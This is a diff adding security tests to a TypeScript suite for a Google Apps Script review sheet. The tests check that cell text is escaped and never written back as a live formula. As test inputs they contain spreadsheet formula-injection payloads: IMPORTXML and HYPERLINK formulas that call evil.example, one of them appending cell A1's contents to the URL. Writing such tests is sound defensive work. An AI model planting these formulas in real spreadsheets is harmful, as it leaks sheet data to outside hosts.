@@ -215,6 +215,16 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     expect((rpc["Agentic status"][2][0] as Rich)).toEqual({ text: "Not started", links: [], bold: [] });
   });
 
+  test("security: a quote in No. cannot break out of the HYPERLINK formula", () => {
+    const t = tabs();
+    t["Review Public Comments"].rows[1][0] = 'x",IMPORTXML("https://evil.example","//a"),"';
+    t.Agent.rows[1][0] = t["Review Public Comments"].rows[1][0];
+    const rt2 = runtime(withConfig(t, pcRows));
+    load(code, rt2.g).refreshAll();
+    const f = rt2.written["Review Public Comments"]["No."][0][0] as string;
+    expect(f).toBe('=HYPERLINK("C#PC-0002","x"",IMPORTXML(""https://evil.example"",""//a""),""")');
+  });
+
   test("an edit rebuilds at once while a rebuild is quick", () => {
     const rt2 = runtime(withConfig(tabs(), pcRows));
     load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent") } });
@@ -426,6 +436,31 @@ describe("review-sheet.gs in drafting mode", () => {
     t.Agent.rows[1][7] = "2026-10-30 23:50Z";
     s.refreshAll();
     expect((rt2.written["Contributor Feedback"]["Staging review page"][0][0] as Rich).text).toBe("review");
+  });
+
+  test("security: text a person or the agent typed is never written back as a formula", () => {
+    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
+    const f = t["Contributor Feedback"].rows;
+    f[0].push("Contributor Feedback (agent)");
+    f.forEach((x, i) => i && x.push(""));
+    // A stale-flagged proposal whose text is a formula, unflagged by the script.
+    f[1][9] = '\u26a0 Stale: the row changed since this proposal; the agent will propose again.\n=IMPORTXML("https://evil.example/?"&A1,"//a")';
+    t.Agent.rows[0].push("Feedback basis (change set)");
+    t.Agent.rows[1].push(feedbackBasis(f[0], f[1]));
+    f[2][2] = '=HYPERLINK("https://evil.example","x"), 1.1 Global challenges';
+    const rt2 = runtime(t);
+    load(code, rt2.g).refreshAll();
+    const w = rt2.written["Contributor Feedback"];
+    expect(w["Contributor Feedback (agent)"][0][0]).toBe("'" + '=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
+  });
+
+  test("security: a large paste rebuilds everything rather than overflow a property", () => {
+    const rt2 = runtime(withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>);
+    const s = load(code, rt2.g);
+    s.markDirty({ range: { getSheet: () => rt2.sheet("Contributor Feedback"), getRow: () => 2, getNumRows: () => 50000 } });
+    expect(rt2.props.rows).toBeUndefined();
+    expect(rt2.written["Contributor Feedback"]["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
   });
 
   test("Issue and Agentic status come from the Agent tab by change set", () => {
